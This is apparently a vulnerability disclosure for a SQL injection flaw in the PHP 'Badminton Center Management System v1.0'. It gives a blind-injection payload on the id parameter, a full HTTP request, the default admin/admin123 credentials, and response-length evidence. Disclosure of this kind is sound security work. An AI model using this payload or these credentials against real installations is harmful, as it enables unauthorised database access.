# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/?page=service_transactions/manage_service_transaction&id=

Vulnerability location: /bcms/admin/?page=service_transactions/manage_service_transaction&id=,id

[+] Payload: /bcms/admin/?page=service_transactions/manage_service_transaction&id=6%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /bcms/admin/?page=service_transactions/manage_service_transaction&id=6%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 33199
![image](https://user-images.githubusercontent.com/54017627/170618523-d98f6f02-c7eb-45ea-95d2-e4bb64b44b47.png)

![image](https://user-images.githubusercontent.com/54017627/170618611-cc44ce0e-0b2e-4c20-bbf2-c703e5795a6e.png)

When length (database ()) = 7, Content-Length: 35681

![image](https://user-images.githubusercontent.com/54017627/170618457-e647d723-2715-47cc-b570-05acef8560a2.png)

![image](https://user-images.githubusercontent.com/54017627/170618588-51aec657-c556-4c21-bd15-8b5e72ed24e0.png)
